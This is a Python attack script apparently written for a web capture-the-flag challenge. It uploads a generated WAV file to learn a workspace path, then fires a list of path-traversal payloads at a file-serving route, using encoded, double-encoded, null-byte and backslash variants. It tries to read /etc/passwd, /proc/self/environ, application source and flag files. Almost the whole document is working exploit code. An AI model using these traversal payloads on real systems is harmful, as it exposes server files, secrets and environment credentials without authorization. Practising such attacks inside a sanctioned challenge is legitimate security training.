#!/usr/bin/env python3
import io, json, re, struct, math, urllib.request, urllib.error, http.cookiejar

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [("User-Agent", "Mozilla/5.0 studio")]

def do(path, data=None, headers=None, method=None, raw=False):
    url = BASE + path if path.startswith("/") else path
    r = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items(): r.add_header(k, v)
    try:
        resp = opener.open(r, timeout=60)
        return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

def make_wav(seconds=1, rate=8000):
    n=seconds*rate
    frames=b"".join(struct.pack("<h",int(3000*math.sin(2*math.pi*220*i/rate))) for i in range(n))
    h=b"RIFF"+struct.pack("<I",36+len(frames))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,rate,rate*2,2,16)+b"data"+struct.pack("<I",len(frames))
    return h+frames

def multipart(files):
    b="----wbnd7392xk"; body=io.BytesIO()
    for k,(fn,ct,c) in files.items():
        body.write(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fn}\"\r\nContent-Type: {ct}\r\n\r\n".encode()); body.write(c); body.write(b"\r\n")
    body.write(f"--{b}--\r\n".encode()); return body.getvalue(), f"multipart/form-data; boundary={b}"

# session + upload + render to learn workspace path
do("/studio")
body,ct=multipart({"clip":("clip.wav","audio/wav",make_wav())})
do("/studio/upload",data=body,headers={"Content-Type":ct},method="POST")
st,h,b=do("/api/render",data=json.dumps({"slug":"audiogram","theme":"midnight"}).encode(),headers={"Content-Type":"application/json"},method="POST")
j=json.loads(b); print("render:",j)
url=j["outputs"][0]["url"]; ws=url.split("/")[2]
print("poster url:",url,"ws:",ws)
st,h,b=do(url); print("GET poster:",st,h.get("Content-Type"),"len",len(b))

def show(label, st, h, b):
    ctype=h.get("Content-Type","")
    s=b[:400]
    printable = all(9<=c<127 or c in (10,13) for c in b[:200]) if b else False
    print(f"[{label}] {st} ct={ctype} len={len(b)} {'TEXT:' if printable else 'bin'} {s[:300] if printable else s[:40]!r}")
    return b

print("\n########## SERVE-ROUTE TRAVERSAL (LFI) ##########")
payloads = [
    f"/m/{ws}/../../../../etc/passwd",
    f"/m/{ws}/..%2f..%2f..%2f..%2fetc%2fpasswd",
    f"/m/{ws}/..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    f"/m/{ws}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    f"/m/{ws}/..%252f..%252f..%252fetc%252fpasswd",
    f"/m/{ws}/....//....//....//....//etc/passwd",
    f"/m/{ws}%2f..%2f..%2f..%2fetc%2fpasswd",
    "/m/../etc/passwd",
    "/m/..%2f..%2f..%2fetc%2fpasswd",
    f"/m/{ws}/../../../../etc/passwd%00.png",
    f"/m/{ws}/..\\..\\..\\..\\etc\\passwd",
]
for p in payloads:
    st,h,b=do(p); show(p, st,h,b)

print("\n########## try reading app source & flag via serve route ##########")
files = ["etc/passwd","app/server.js","server.js","app/app.js","app.js","proc/self/environ",
         "app/flag.txt","flag.txt","flag","app/flag","srv/app/flag.txt","root/flag.txt",
         "app/config.js","app/package.json","proc/self/cmdline"]
for f in files:
    for tpl in [f"/m/{ws}/../../../../../{f}", f"/m/{ws}/..%2f..%2f..%2f..%2f..%2f{f}"]:
        st,h,b=do(tpl)
        if st==200 and (b[:15]!=b"\x89PNG\r\n\x1a\n"[:8]):
            show("HIT "+tpl, st,h,b)

print("\n########## full studio inline JS ##########")
st,h,b=do("/studio")
m=re.search(r"<script>\s*\(function.*?</script>", b.decode('utf-8','replace'), re.S)
print(m.group(0)[:2500] if m else "no inline")

print("\nDONE")
